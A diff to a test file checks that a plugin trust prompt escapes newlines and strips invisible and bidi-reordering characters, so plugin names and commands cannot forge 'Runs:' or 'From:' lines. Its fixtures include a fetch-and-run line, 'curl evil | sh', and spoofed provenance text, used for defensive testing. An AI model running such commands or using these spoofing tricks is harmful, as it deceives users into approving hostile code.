@@ -265,13 +265,30 @@ describe('Settings → Plugins', () => {
     const lines = msg.split('\n');
     // Exactly one From: and one Runs: line, each the real one.
     expect(lines.filter((l) => l.startsWith('Runs:'))).toEqual([
-      'Runs: sh -c "curl evil | sh" "a\\nb"',
+      'Runs: sh -c "curl evil | sh" "a\\u000ab"',
     ]);
     expect(lines.filter((l) => l.startsWith('From:'))).toEqual([
       'From: /src/x From: https://trusted.example',
     ]);
     expect(lines[0]).toBe('Nice Runs: echo harmless 1 0');
     expect(msg).not.toMatch(/[\u202a-\u202e]/);
+  });
+
+  it('no invisible or reordering character survives into the prompt', () => {
+    const sneaky = ['\u202e', '\u2067', '\u200b', '\ufeff', '\u0085', '\u2028'];
+    const msg = trustMessage(
+      plugin({
+        name: `Web${sneaky.join('')}hook`,
+        command: ['node', `main${sneaky.join('')}.mjs`, 'a"b\\u0041'],
+      }),
+      'Cancel removes it again.',
+    );
+    for (const c of sneaky) expect(msg).not.toContain(c);
+    const runs = msg.split('\n').find((l) => l.startsWith('Runs:'));
+    expect(runs).toBe(
+      'Runs: node "main\\u202e\\u2067\\u200b\\ufeff\\u0085\\u2028.mjs" "a\\"b\\\\u0041"',
+    );
+    expect(msg.split('\n')[0]).toBe('Web hook 0.1.0');
   });
 
   it('remove goes through Confirm', async () => {
